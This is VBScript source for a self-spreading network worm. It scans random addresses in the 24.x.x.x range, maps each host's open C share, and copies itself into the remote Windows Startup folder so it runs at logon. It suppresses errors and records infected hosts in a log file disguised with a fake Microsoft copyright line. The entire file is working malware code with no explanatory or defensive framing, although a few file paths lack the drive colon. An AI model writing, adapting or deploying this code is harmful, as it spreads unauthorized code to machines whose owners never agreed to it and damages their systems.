dim oa
dim ob
dim oc
dim od
dim rand
dim dot
dim driveconnected
dim sharename
dim count
dim logfile
count = "0"
oa = "24"
dot = "."
driveconnected="0"
set wshnetwork = wscript.createobject("wscript.network")
set fso1 = createobject("scripting.filesystemobject")
set fso2 = createobject("scripting.filesystemobject")
on error resume next
randomize
checkfile()
randaddress()

do
do while driveconnected = "0"
checkaddress()
shareformat()
wshnetwork.mapnetworkdrive "z", sharename
enumdrives()
loop
copyfiles()
logfile.writeline("hop @   " & oa & dot & ob & dot & oc & dot & od)
disconnectdrive()
loop

function disconnectdrive()
wshnetwork.removenetworkdrive "z"
driveconnected = "0"
end function

function checkfile()
if (fso1.fileexists("c\netwk.log")) then
set logfile = fso1.opentextfile("c\netwk.log",8)
logfile.writeline("--- break ---")
else
set logfile = fso1.createtextfile("c\netwk.log", True)
logfile.writeline("Copyright (c) 1993-1995 Microsoft Corp.")
end if
end function

function copyfiles()
set fso = createobject("scripting.filesystemobject")
fso.copyfile "c\windows\startm~1\programs\startup\Net-Enh.vbs", "z\windows\startm~1\programs\startup\"
fso.copyfile "c\netwk.log", "z\"
end function

function checkaddress()
od = od + 1
if od = "255" then randaddress()
end function

function shareformat()
sharename = "\\" & oa & dot & ob & dot & oc & dot & od & "\C"
end function

function enumdrives()
set odrives = wshnetwork.enumnetworkdrives
for i = 0 to odrives.count -1
if sharename = odrives.item(i) then
driveconnected = 1
end if
next
end function

function randum()
rand = int(256 * rnd)
end function

function randaddress()
randum()
ob=rand
randum()
oc=rand
od="0"
logfile.writeline("subnet  " & oa & dot & ob & dot & oc & dot & "0")
end function
